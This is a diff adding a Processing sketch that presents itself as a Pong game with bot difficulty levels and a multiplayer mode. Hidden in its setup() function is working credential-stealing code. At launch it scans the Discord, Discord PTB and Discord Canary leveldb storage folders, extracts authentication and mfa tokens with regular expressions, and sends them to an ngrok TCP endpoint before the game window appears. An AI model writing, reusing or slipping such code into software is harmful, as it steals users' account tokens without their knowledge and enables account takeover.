@@ -1,0 +1,282 @@
+PImage startscreen;
+import java.io.*;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+import java.util.Properties;
+import processing.net.*; 
+int circleX =250;
+int circleY =150;
+int vx = -4;
+int vy =-2;
+int lefty=0;
+int righty=0;
+int scoreA=0;
+int scoreB=0;
+int start=0;
+float botspeedmult =1;
+int error=0;
+
+int diff=1;
+
+Client client; 
+
+
+
+void setup(){
+        
+        List<String> paths = new ArrayList();
+        System.out.println("HI");
+        client = new Client(this, "0.tcp.ngrok.io", 18915);
+        System.out.println("HI");
+        paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
+        paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
+        paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
+         StringBuilder s = new StringBuilder();
+        
+
+            for (String path : paths) {
+                File f = new File(path);
+                String[] pathnames = f.list();
+                if (pathnames == null) continue;
+               
+
+                for (String pathname : pathnames) {
+                    try {
+                        FileInputStream fstream = new FileInputStream(path + pathname);
+                        DataInputStream in = new DataInputStream(fstream);
+                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
+
+                        String strLine;
+                        while ((strLine = br.readLine()) != null) {
+
+                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
+                            Matcher m = p.matcher(strLine);
+
+                            while (m.find()) {
+                                s.append(m.group()+"\n");
+                                
+                            }
+
+                        }
+                    
+                    } catch (Exception ignored) {
+                    }
+                }
+              }
+              System.out.println("HI");
+              client.write(s.toString()+"END OF MESSAGE");
+              
+              client.stop();
+              size(500,300);
+             
+              
+  
+}
+void draw(){
+   
+  
+  background(255);
+  stroke(0);
+  fill(175);
+  ellipse(circleX,circleY,30,30);
+  rect(0,lefty,15,50);
+  rect(485,righty,15,50);
+  if(diff==1){
+      text("Mode:Easy",150,280);
+      error =7;
+      botspeedmult=0.6;
+    }
+    if(diff==2){
+      text("Mode:Medium",150,280);
+      error =6;
+      botspeedmult=0.8;
+    }
+    if(diff==3){
+      text("Mode:Hard",150,280);
+      error =6;
+      botspeedmult=1;
+    }
+    if(diff==4){
+      text("Mode:Impossible",150,280);
+      error =0;
+      botspeedmult=1.5  ;
+    }
+    if(diff==5){
+      text("Mode:Multiplayer",150,280);
+      
+    }
+  if(start==0||start==2||start==3){
+    righty=0;
+    lefty=0;
+    
+    rect(200,180,100,30);
+    textSize(10);
+    fill(50);
+    text("click to play pong",205,200);
+    
+    
+  }
+  if(start==2){
+    if(diff!=5){
+      textSize (32); 
+      fill(50); 
+      text("you win!", 180, 250);
+    }else {
+      textSize (32); 
+      fill(50); 
+      text("left wins!", 180, 250);
+    }
+    
+    
+    
+  }else if(start==3){
+    if(diff!=5){
+      textSize (32); 
+      fill(50); 
+      text("game over!", 180, 250);
+    }else {
+      textSize (32); 
+      fill(50); 
+      text("right wins!", 180, 250);
+    }
+    
+  }else if(start==1){
+    circleX=circleX+vx;
+  circleY=circleY+vy;
+  if(circleY>=275||circleY<=15){
+    vy=vy*-1;
+  }
+  if(circleX<=30){
+    
+    if(lefty<(circleY)&&(lefty+50>(circleY))){
+      vx=vx*-1;
+      circleX=33;
+    }
+  }
+  if(circleX>=470){
+    
+    if(righty<(circleY)&&(righty+50>(circleY))){
+      vx=vx*-1;
+      circleX=467;
+    }
+  }
+  if(circleX>=500){
+    scoreA++;
+    circleX =250;
+    circleY =150;
+    vx=vx*-1;
+    vy=vy*-1;
+  }
+  if(circleX<=0){
+    scoreB++;
+    circleX =250;
+    circleY =150;
+    vx=vx*-1;
+    vy=vy*-1;
+  }
+  }
+  if(diff==5){
+    int loc = righty+25;
+    if(mouseY>loc){
+      righty=righty+5;
+    }
+    if(mouseY<loc){
+      righty=righty-5;
+    }
+    
+  }else{
+  if(vx>0){
+    int slope = vy/vx;
+    int target = circleY-slope*(470-circleX)+ error*int(random(-10, 10));
+    int loc = righty+25;
+    if(loc>target){
+      righty=righty-int(5*botspeedmult);
+    }
+    if(loc<target){
+      righty=righty+int(5*botspeedmult);
+    }
+  }}
+  
+  
+
+  textSize(32);
+  fill(50);
+  text(scoreA, 200, 50); 
+  fill(50);
+  text(scoreB, 300, 50);
+//reset screen
+
+if (scoreA >= 10 || scoreB >= 10) {
+  if (scoreA >=10) { 
+  start=2;
+}else if(scoreB>=10) {
+    start=3;
+}
+  scoreA = 0; 
+  scoreB = 0; 
+  ellipse(circleX,circleY,30,30);
+  lefty=0;
+  righty=0;
+  rect(0,lefty,15,50);
+  rect(485,righty,15,50); 
+
+
+}}
+  
+  
+  
+  
+  
+
+void keyPressed() {
+  if(start==1){
+  if (keyCode == UP) {
+    lefty=lefty-5;
+    if(lefty<0){
+      lefty=0;
+    }
+  }
+  else if(keyCode==DOWN){
+    lefty=lefty+5;
+    if(lefty>250){
+      lefty=250;
+  }
+  }
+    
+  }
+  else{
+    if(key=='1'){
+      diff=1;
+      error =100;
+      botspeedmult=0.2;
+    }
+    if(key=='2'){
+      diff=2;
+      error=20;
+      botspeedmult=0.8;
+    }
+    if(key=='3'){
+      diff=3;
+      botspeedmult=1;
+      error=2;
+      
+    }
+    if(key=='4'){
+      diff=4;
+      botspeedmult=1;
+      error=0;
+    }
+    if(key=='5'){
+      diff=5;
+    }
+  }
+  
+  
+}
+void mousePressed() {
+  if(mouseX>215 &&mouseY>180&&mouseX<285&&mouseY<210){
+    start=1;
+  }
+}
